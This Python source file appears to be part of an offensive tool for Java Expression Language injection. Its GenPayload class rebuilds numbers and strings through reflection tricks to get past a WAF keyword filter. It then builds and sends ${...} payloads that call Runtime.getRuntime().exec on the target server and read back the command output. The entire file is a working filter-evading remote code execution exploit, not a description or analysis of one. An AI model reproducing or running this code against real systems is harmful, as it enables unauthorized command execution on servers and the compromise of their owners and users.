import requests
import string
import json
from collections import OrderedDict
from .utils import RequestHandler, Utils

utils = Utils()


class GenPayload:

    def __init__(self, reqHandler, waf):
        self.reqHandler = reqHandler
        self.waf = waf
        self.WORDLIST = ["java", "Char", "char", ".", "(", ")"]
        self.STARTING_SUBSTRING_TABLE = {}
        self.STRING_CLASS = ""
        self.ARRAY_CLASS = ""
        self.FORNAME_METHOD_INDEX = 2
        self.ASC_toStringMethod_INDEX = 5
        self.RUNTIME_GETRUNTIME_INDEX = 6
        self.INPUTSTREAMREADER_CONSTRUCTOR_INDEX = 3
        self.BUFFERED_READER_CONSTRUCTOR_INDEX = 1
        self.LETTERS = string.ascii_letters
        self.SUBSTRING_TABLE = OrderedDict()

        self.GEN_NUM_METHOD = ""

        self.initialize()

    def chooseNumMethod(self) -> str:
        if utils.checkNoDigits(self.waf):
            return "genNumNatural"
        if all(
            element not in ["[", "]", "[]", ".", "size", "()"] for element in self.waf
        ):
            return "genNumArraySize"
        if all(
            element
            not in [
                "[",
                "]",
                "[]",
                ".",
                "hashCode",
                "mod",
                "div",
                "getClass",
                "getPackage",
                "substring",
                "length",
                "concat",
                "()",
            ]
            for element in self.waf
        ):
            return "genNumHashCode"
        if all(element not in ['"', "length", "()"] for element in self.waf):
            return "genNumStringDouble"
        if all(element not in ["'", "length", "()"] for element in self.waf):
            return "genNumStringSingle"

    def genRule(self):
        # numeric generate rule
        self.GEN_NUM_METHOD = self.chooseNumMethod()
        # String Class
        if all(element not in ['"', "getClass", "()"] for element in self.waf):
            self.STRING_CLASS = '"".getClass()'
        elif all(
            element not in ["[", "]", "[]", "getClass", "toString", "()"]
            for element in self.waf
        ):
            self.STRING_CLASS = "[].getClass().toString().getClass()"
        if all(
            element not in ["[", "]", "[]", "getClass", "()"] for element in self.waf
        ):
            self.ARRAY_CLASS = "[].getClass()"

        if self.GEN_NUM_METHOD == "":
            raise Exception("Seem to can't generate number -> generate payload failed")
        if self.STRING_CLASS == "" and self.ARRAY_CLASS == "":
            raise Exception("Seem to can't generate string -> generate payload failed")

    def initialize(self):
        self.genRule()
        if self.STRING_CLASS != "":
            self.CLASS_CLASS = self.STRING_CLASS + ".getClass()"
        elif self.ARRAY_CLASS != "":
            self.CLASS_CLASS = self.ARRAY_CLASS + ".getClass()"
        for l in self.LETTERS:
            self.WORDLIST.append(l)

        self.genSubstringTable()
        for word in self.WORDLIST:
            if word in self.STARTING_SUBSTRING_TABLE:
                self.SUBSTRING_TABLE[word] = self.STARTING_SUBSTRING_TABLE[word]

    def genNum(self, num):
        if hasattr(self, self.GEN_NUM_METHOD):
            method = getattr(self, self.GEN_NUM_METHOD)
            return method(num)
        else:
            raise Exception("Generate number method not found!")

    def genNumNatural(self, num):
        return str(num)

    def genNumArraySize(self, num):
        """
        Generate payload for getting number using array size

        :param num: Number
        """
        null_list = ",".join(["[]"] * num)
        result = f"[{null_list}].size()"
        return result

    def genNumHashCode(self, num):
        """
        Generate payload for getting number using hash code

        :param num: Number
        """

        def genNumber(num):
            if num == 0:
                return "[].hashCode() mod [].hashCode()"
            if num == 1:
                return "[].hashCode() div [].hashCode()"

            return genStringInt("p" * num) + ".length()"

        def genStringInt(str):
            v = "[].getClass().getPackage().toString()"
            if len(str) == 1:
                return f"{v}.substring({genNumber(0)}, {genNumber(1)})"
            return f"{v}.substring({genNumber(0)}, {genNumber(1)}).concat({genStringInt(str[1:])})"

        return genNumber(num)

    def genNumStringDouble(self, num):
        """
        Generate payload for getting number using string in double quotes

        :param num: Number
        """
        return '"' + "s" * num + '"' + ".length()"

    def genNumStringSingle(self, num):
        """
        Generate payload for getting number using string in single quotes

        :param num: Number
        """
        return "'" + "s" * num + "'" + ".length()"

    def genEL(self, content):
        """
        Generate EL payload

        :param content: Content
        """

        return "${" + content + "}"

    def getMethodIndexFromClass(self, classStr, index):
        return f"{classStr}.getMethods()[{self.genNum(index)}]"

    def getDeclaredField(self, classStr, index):
        indexNum = self.genNum(index)
        return f"{classStr}.getDeclaredFields()[{indexNum}]"

    def enrichSubstringTable(self, source, sourceIndex, str):
        for word in self.WORDLIST:
            if word in self.STARTING_SUBSTRING_TABLE:
                continue

            index = str.find(word)
            if index >= 0:
                self.STARTING_SUBSTRING_TABLE[word] = [
                    source,
                    sourceIndex,
                    index,
                    index + len(word),
                ]

    def genSubstringTable(self):
        """
        Generate substring table

        Example: 'java': ['stringFields', 0, 0, 4] means that the word 'java' can be replace
        with the substring of the first field of the array class from index 0 to 4
        """
        if self.STRING_CLASS != "":
            # String fields
            for i in range(10):
                payload = f"{self.genEL(self.getDeclaredField(self.STRING_CLASS, i))}"
                randomPrefix = utils.randomString(length=10)
                randomSubfix = utils.randomString(length=10)
                payload = f"{randomPrefix}{payload}{randomSubfix}"
                result = utils.getDataFromResponse(
                    self.reqHandler.sendPayload(payload), randomPrefix, randomSubfix
                )
                self.enrichSubstringTable("stringFields", i, result)

            # String methods
            for i in range(80):
                payload = (
                    f"{self.genEL(self.getMethodIndexFromClass(self.STRING_CLASS, i))}"
                )
                randomPrefix = utils.randomString(length=10)
                randomSubfix = utils.randomString(length=10)
                payload = f"{randomPrefix}{payload}{randomSubfix}"
                result = utils.getDataFromResponse(
                    self.reqHandler.sendPayload(payload), randomPrefix, randomSubfix
                )
                self.enrichSubstringTable("stringMethods", i, result)
        if self.ARRAY_CLASS != "":
            # String fields
            for i in range(10):
                payload = f"{self.genEL(self.getDeclaredField(self.ARRAY_CLASS, i))}"
                randomPrefix = utils.randomString(length=10)
                randomSubfix = utils.randomString(length=10)
                payload = f"{randomPrefix}{payload}{randomSubfix}"
                result = utils.getDataFromResponse(
                    self.reqHandler.sendPayload(payload), randomPrefix, randomSubfix
                )
                self.enrichSubstringTable("arrayFields", i, result)

            # String methods
            for i in range(80):
                payload = (
                    f"{self.genEL(self.getMethodIndexFromClass(self.ARRAY_CLASS, i))}"
                )
                randomPrefix = utils.randomString(length=10)
                randomSubfix = utils.randomString(length=10)
                payload = f"{randomPrefix}{payload}{randomSubfix}"
                result = utils.getDataFromResponse(
                    self.reqHandler.sendPayload(payload), randomPrefix, randomSubfix
                )
                self.enrichSubstringTable("arrayMethods", i, result)

    def genSubstring(self, object, indexStart, indexEnd):
        return f"{object}.toString().substring({self.genNum(indexStart)},{self.genNum(indexEnd)})"

    def genWord(self, word):
        if word not in self.WORDLIST:
            return "null"
        try:
            source, sourceIndex, indexStart, indexEnd = self.SUBSTRING_TABLE[word]
        except KeyError:
            return self.genASCToString(ord(word))
        if source == "stringFields":
            object = self.getDeclaredField(self.STRING_CLASS, sourceIndex)
        elif source == "stringMethods":
            object = self.getMethodIndexFromClass(self.STRING_CLASS, sourceIndex)
        elif source == "arrayFields":
            object = self.getDeclaredField(self.ARRAY_CLASS, sourceIndex)
        elif source == "arrayMethods":
            object = self.getMethodIndexFromClass(self.ARRAY_CLASS, sourceIndex)

        return self.genSubstring(object, indexStart, indexEnd)

    def genConcatStr(self, left, middle, right):

        currentStr = ""
        if left != "":
            currentStr = left

        if currentStr != "":
            currentStr += f".concat({middle})"
        else:
            currentStr = middle

        if right != "":
            currentStr += f".concat({right})"

        return currentStr

    def genClassForname(self, className):
        forname = self.getMethodIndexFromClass(
            self.CLASS_CLASS, self.FORNAME_METHOD_INDEX
        )
        class_str = self.genString(className)
        return f"{forname}.invoke(null, {class_str})"

    def genASCToString(self, asc):
        characterClass = self.genClassForname("java.lang.Character")
        toStringMethod = self.getMethodIndexFromClass(
            characterClass, self.ASC_toStringMethod_INDEX
        )
        ascNumber = self.genNum(asc)

        return f"{toStringMethod}.invoke(null, {ascNumber})"

    def genString(self, str, wordIndex=0):
        if wordIndex >= len(self.WORDLIST):
            currentStr = ""

            for ch in str:
                ch_str = self.genASCToString(ord(ch))
                if currentStr != "":
                    currentStr = f"{currentStr}.concat({ch_str})"
                else:
                    currentStr += ch_str

            return currentStr

        if len(str) == 0:
            return ""

        # find words
        word = self.WORDLIST[wordIndex]

        if str == word:
            return self.genWord(word)
        index = str.find(word)
        if index >= 0:

            if index > 0:
                left = self.genString(str[:index])
            else:
                # avoid -1 getting more data
                left = ""

            right = self.genString(str[index + len(word) :])
            processed_word = self.genWord(word)
            return self.genConcatStr(left, processed_word, right)
        else:
            return self.genString(str, wordIndex + 1)

    def genInvokeMethod(self, method, params):
        current = f"{method}.invoke(null"
        for param in params:
            param_str = ", " + self.genString(param)
            current += param_str
        current += ")"
        return current

    def sendPayload(self, payload):
        # Prepare payload
        randomPrefix = utils.randomString(length=10, filtered=self.waf)
        randomSubfix = utils.randomString(length=10, filtered=self.waf)
        payload = f"{randomPrefix}{payload}{randomSubfix}"
        response = self.reqHandler.sendPayload(payload)

        result = utils.getDataFromResponse(response, randomPrefix, randomSubfix)

        return response, result

    def genExecPayload(self, command):
        forNameRuntime = self.genClassForname("java.lang.Runtime")
        forNameInputStreamReader = self.genClassForname("java.io.InputStreamReader")
        forNameBufferedReader = self.genClassForname("java.io.BufferedReader")
        getRuntimeMethod = self.getMethodIndexFromClass(
            forNameRuntime, self.RUNTIME_GETRUNTIME_INDEX
        )
        getRuntime = self.genInvokeMethod(getRuntimeMethod, [])
        command = command
        bashPayload = self.genString(command)
        execPayload = getRuntime + ".exec(" + bashPayload + ").getInputStream()"

        inputStreamReader = f"{forNameInputStreamReader}.getDeclaredConstructors()[{self.genNum(self.INPUTSTREAMREADER_CONSTRUCTOR_INDEX)}]"
        inputStreamPayload = f"{inputStreamReader}.newInstance({execPayload})"

        bufferedReader = f"{forNameBufferedReader}.getDeclaredConstructors()[{self.genNum(self.BUFFERED_READER_CONSTRUCTOR_INDEX)}]"
        innerPayload = f"{bufferedReader}.newInstance({inputStreamPayload}).readLine()"
        payload = self.genEL(innerPayload)

        response, result = self.sendPayload(payload)
        return result

    def genExecPayloadNoOutput(self, command):
        forNameRuntime = self.genClassForname("java.lang.Runtime")
        getRuntimeMethod = self.getMethodIndexFromClass(
            forNameRuntime, self.RUNTIME_GETRUNTIME_INDEX
        )
        getRuntime = self.genInvokeMethod(getRuntimeMethod, [])
        bashPayload = self.genString(command)
        execPayload = getRuntime + ".exec(" + bashPayload + ")"
        payload = self.genEL(execPayload)
        response, result = self.sendPayload(payload)
        if "Process" in result and "exitValue" in result:
            return "Command seem to be executed"
